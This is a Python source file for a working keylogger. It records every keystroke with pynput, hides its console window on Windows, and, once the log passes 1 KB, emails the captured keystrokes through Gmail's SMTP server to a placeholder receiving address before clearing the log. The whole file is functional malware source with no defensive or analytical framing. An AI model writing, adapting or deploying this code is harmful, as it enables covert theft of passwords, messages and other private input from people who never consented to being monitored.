import os
import time
import smtplib
from pynput.keyboard import Listener, Key
from threading import Thread
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

log_file = "keylog.txt"

sender_email = "your_email@gmail.com"
sender_password = "your_email_password"
receiver_email = "target_email@gmail.com"
smtp_server = "smtp.gmail.com"
smtp_port = 587

def send_email(log_data):
    try:
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = "Keylogger Logs"

        message.attach(MIMEText(log_data, "plain"))

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Logs sent to email.")
    except Exception as e:
        print(f"Error sending email: {e}")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_to_log = key.char
        elif key == Key.space:
            key_to_log = " "
        elif key == Key.enter:
            key_to_log = "\n"
        elif key == Key.tab:
            key_to_log = "\t"
        elif key == Key.backspace:
            key_to_log = "<BACKSPACE>"
        else:
            key_to_log = str(key).replace("'", "")

        with open(log_file, "a") as log:
            log.write(key_to_log)
        
        if os.path.getsize(log_file) > 1024: 
            with open(log_file, "r") as log:
                log_data = log.read()
            send_email(log_data)
            open(log_file, "w").close()

    except Exception as e:
        print(f"Error capturing keystroke: {e}")
        
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def hide_script():
    try:
        if os.name == "nt":
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception as e:
        print(f"Error hiding script window: {e}")

def initialize_log_file():
    try:
        if not os.path.exists(log_file):
            with open(log_file, "w") as log:
                log.write("Keylogger started...\n")
    except Exception as e:
        print(f"Error initializing log file: {e}")

def main():
    initialize_log_file()  
    hide_script()  
    keylogger_thread = Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    while True:
        time.sleep(10)  

if __name__ == "__main__":
    main()

